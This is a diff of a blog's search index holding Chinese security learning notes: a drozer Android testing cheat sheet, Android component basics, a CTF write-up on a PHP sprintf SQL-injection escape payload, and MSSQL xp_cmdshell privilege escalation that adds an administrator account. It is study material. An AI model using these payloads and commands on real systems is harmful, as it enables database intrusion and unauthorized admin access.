@@ -1,6 +1,31 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[安卓渗透框架drozer使用]]></title>
+    <url>%2F2018%2F07%2F09%2F%E5%AE%89%E5%8D%93%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6drozer%E4%BD%BF%E7%94%A8%2F</url>
+    <content type="text"><![CDATA[获取安卓设备上的所有安卓的app信息12run app.package.listrun app.package.list -f [关键字] 获取sieve的一些基本信息1run app.package.info -a com.mwr.example.sieve 确定攻击面1run app.package.attacksurface com.mwr.example.sieve exported表示组件可以被其他app利用services is debugged 表示我们可以用adb绑定一个调试器到进程 获取activity组件信息1run app.activity.info -a com. 启动activity组件（测试越权）1run app.activity.start —component com.mwr.example.sieve com.mwr.example.sieve.PWList 获取contentprovider组件信息1run app.provider.info -a 查找可以访问content provider的URI（数据泄露）1run scanner.provider.finduris -a com. 从content url中获取数据1run app.provider.query content://com.mwr —vertical 进行sql注入12run app.provider.query content://com. —-projection [select &lt;projection&gt; from xxxx]run app.provider.query content://com. —selection [where &lt;condition&gt;] 读取文件1run app.provider.read 下载文件1run app.provider.download 检测sql注入1run scanner.provider.injection -a com. 检测文件遍历1run scanner.provider.traversal -a com. 获取service组件信息1run app.service.info -a com. 向某个服务发送信息1run app.service.send com.mwr.example.sieve com.mwr.example.sieve.CryptoService —msg 获取broadcast组件信息1run app.broadcast.info -a com.]]></content>
+      <categories>
+        <category>移动安全</category>
+      </categories>
+      <tags>
+        <tag>移动安全</tag>
+        <tag>安卓</tag>
+        <tag>drozer</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[安卓四大组件]]></title>
+    <url>%2F2018%2F07%2F09%2F%E5%AE%89%E5%8D%93%E5%9B%9B%E5%A4%A7%E7%BB%84%E4%BB%B6%2F</url>
+    <content type="text"><![CDATA[Activity对于程序中的每一个界面都是一个Activity， 每一个Activity有不同的功能，比如登录、注册、 注册码验证、手势密码等，Activity之间的切换需 要满足一定的条件。 ContentProviderContentProvider用于保存和获取数据，并使其对所有应用程序可见。 这是不同应用程序间共享数据的唯一方式，因为android没有提供所有应用共同访问的公共存储区。比如通讯录数据。 ServiceService服务是伴随着程序启动，一直运行在后台，主要起检测作用的执行代码。服务一般用于时刻检测客户端的更新状态、时刻检测是否异地登录、时刻上传用户的操作信息 Broadcast广播是当程序检测到外界的某种运行环境发生变化时，而执行的逻辑代码，比如程序的自启、网络变化变化、实时消息(打车软件)。]]></content>
+      <categories>
+        <category>移动安全</category>
+      </categories>
+      <tags>
+        <tag>移动安全</tag>
+        <tag>安卓</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[由一次CTF引发的学习笔记之PHP的sprintf函数]]></title>
     <url>%2F2018%2F06%2F19%2F%E7%94%B1%E4%B8%80%E6%AC%A1CTF%E5%BC%95%E5%8F%91%E7%9A%84%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8BPHP%E7%9A%84sprintf%E5%87%BD%E6%95%B0%2F</url>
     <content type="text"><![CDATA[0x01 前言周末打了一次LCTF，感觉这次题目出的好难，其中做了Simple blog题的时候，发现了一个神奇的知识点：用php的sprintf函数来绕过mysql_real_escape_string()函数进行sql注入。 PS.在写这篇文章的时候发现都php源码的重要性，在看seebug的文章的时候，发现其对sprintf的$符号的用法一笔带过，对于初学者来说根本无法理解这个符号在sprintf中的作用，幸亏那篇文章有php源码的链接，自己看了看才懂得$符号究竟的用来干什么的，感叹一下果然文档不是万能的，自己读源码才是王道啊。 0x02 赛题复现这道题最先是一个padding oracle，写脚本跑出来token后就可以进入admin.php了，这里给一下admin.php的代码12345678910111213141516171819202122232425262728&lt;?phperror_reporting(0);session_start();include(&apos;config.php&apos;);if(!$_SESSION[&apos;isadmin&apos;])&#123; die(&apos;You are not admin&apos;);&#125;if(isset($_GET[&apos;id&apos;]))&#123; $id = mysql_real_escape_string($_GET[&apos;id&apos;]); if(isset($_GET[&apos;title&apos;]))&#123; $title = mysql_real_escape_string($_GET[&apos;title&apos;]); $title = sprintf(&quot;AND title=&apos;%s&apos;&quot;, $title); &#125;else&#123; $title = &apos;&apos;; &#125; $sql = sprintf(&quot;SELECT * FROM article WHERE id=&apos;%s&apos; $title&quot;, $id); $result = mysql_query($sql,$con); $row = mysql_fetch_array($result); if(isset($row[&apos;title&apos;])&amp;&amp;isset($row[&apos;content&apos;]))&#123; echo &quot;&lt;h1&gt;&quot;.$row[&apos;title&apos;].&quot;&lt;/h1&gt;&lt;br&gt;&quot;.$row[&apos;content&apos;]; die(); &#125;else&#123; die(&quot;This article does not exist.&quot;); &#125;&#125;?&gt; 通过之前得到的token可以绕过第一个if判断，然后往下看推测是一个注入。这里id和title两个参数是我们可控的，但是都用了mysql_real_escape_string()进行转移了，先来看一下mysql_real_escape_string()的功能 因此，正常情况下想要注入的话几乎是不可能的。但是，这里有个奇特之处在于使用了两个sprintf函数进行拼接，并且第一个sprintf后的结果拼接到了第二个sprintf里面。这里利用了sprintf的一个小特性可以逃逸单引号，具体原理之后说，我们先来看看结果如何 可以看到当and 1=1的时候返回正常，当and 1=2的时候返回错误，因此可以注入！ 0x03 漏洞原理这里我们利用了sprintf的一个padding功能，是的单引号被吃掉了，可以看到php文档中有一个例子如下： 这里的用法就是在格式化字符串中，单引号后面的字符代表着用该字符去进行填充，那么如果能够提前输入1%&apos; and 1=1# 如果存在addslashes或者mysql_real_escape_string等之类的过滤，把单引号进行了转义，变成\’，那么其中的反斜杠会被sprintf认为是填充的字符，从而吃掉了反斜杠，达到单引号逃逸的目的。 但是在这道题中，如果用1%&apos; and 1=1# 这个的话还是不好用，因为这种方式容易遇到PHP Warning: sprintf(): Too few arguments的报错。 因此还需要sprintf的另一个trick。 如上图，文档中还有一个例子，其中%后面的数字代表着第几个参数，$符号在这里的作用是中止符，用来检测前面有几个数字的，而$符号后面的字母代表着参数类型，s表示stirng类型，因此可以构造1%1$&apos;%s&apos; 这里的意思就是，第一个参数，用%进行填充，类型为stirng，那么最后刚好剩余了一个单引号，成功逃逸！因此，第一个id参数就要输入正常的，在title参数时输入%1$’%即可。在这道题里就是12id=3title=This is admin page%1$&apos; and 1=1# ok，成功！ 0x04 参考https://paper.seebug.org/386/https://github.com/php/php-src/blob/c8aa6f3a9a3d2c114d0c5e0c9fdd0a465dbb54a5/ext/standard/formatted_print.c]]></content>
@@ -472,7 +497,7 @@
   <entry>
     <title><![CDATA[MSSQL提权之xp_cmdshell]]></title>
     <url>%2F2018%2F06%2F10%2FMSSQL%E6%8F%90%E6%9D%83%E4%B9%8Bxp-cmdshell%2F</url>
-    <content type="text"><![CDATA[0x01 前提 getshell或者存在sql注入并且能够执行命令。 sql server是system权限，sql server默认就是system权限。 0x02 xp_cmdshell 有了xp_cmdshell的话可以执行系统命令，该组件默认是关闭的，因此需要把它打开。 开启xp_cmdshell12exec sp_configure &apos;show advanced options&apos;, 1;reconfigure;exec sp_configure &apos;xp_cmdshell&apos;,1;reconfigure; 关闭xp_cmdshell12exec sp_configure &apos;show advanced options&apos;, 1;reconfigure;exec sp_configure &apos;xp_cmdshell&apos;, 0;reconfigure 0x03 提权12exec master..xp_cmdshell &apos;net user test pinohd123. /add&apos; 添加用户test，密码testexec master..xp_cmdshell &apos;net localgroup administrators test add&apos; 添加test用户到管理员组]]></content>
+    <content type="text"><![CDATA[0x01 前提 getshell或者存在sql注入并且能够执行命令。 sql server是system权限，sql server默认就是system权限。 0x02 xp_cmdshell有了xp_cmdshell的话可以执行系统命令，该组件默认是关闭的，因此需要把它打开。 开启xp_cmdshell12exec sp_configure &apos;show advanced options&apos;, 1;reconfigure;exec sp_configure &apos;xp_cmdshell&apos;,1;reconfigure; 关闭xp_cmdshell12exec sp_configure &apos;show advanced options&apos;, 1;reconfigure;exec sp_configure &apos;xp_cmdshell&apos;, 0;reconfigure 0x03 提权12exec master..xp_cmdshell &apos;net user test pinohd123. /add&apos; 添加用户test，密码testexec master..xp_cmdshell &apos;net localgroup administrators test add&apos; 添加test用户到管理员组]]></content>
       <categories>
         <category>渗透测试</category>
       </categories>
